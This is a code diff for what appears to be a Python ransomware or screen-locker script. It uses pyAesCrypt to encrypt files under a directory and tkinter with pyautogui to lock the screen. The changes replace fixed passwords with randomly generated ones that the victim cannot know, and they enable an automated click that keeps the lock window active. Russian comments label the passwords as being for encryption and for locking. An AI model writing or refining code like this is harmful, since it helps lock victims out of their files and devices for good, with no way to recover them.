@@ -1,14 +1,26 @@
 import os
 import sys
 import pyAesCrypt
+import secrets
+import string
 from threading import Thread
 from pyautogui import click, moveTo, FailSafeException
 from tkinter import Tk, Entry, Label
 from time import sleep
 
 direct = r"C:\test"
-crypt_pass = '12345'
-locker_pass = "qwerty"
+
+def generate_password(length=12):
+    # Набор символов для генерации пароля
+    chars = string.ascii_letters + string.digits + string.punctuation
+    # Генерация случайного пароля
+    password = ''.join(secrets.choice(chars) for i in range(length))
+    return password
+
+# Генерация случайных паролей
+crypt_pass = generate_password(16)  # Для шифрования
+locker_pass = generate_password(12)  # Для блокировки
+
 
 def locker():
     global k, entry
@@ -61,7 +73,7 @@ def locker():
     entry.place(width=150, height=50, x=600, y=400)
     root.update()
     sleep(0.2)
-    # click(675, 420)
+    click(675, 420)
     k = False
     while not k:
         block()
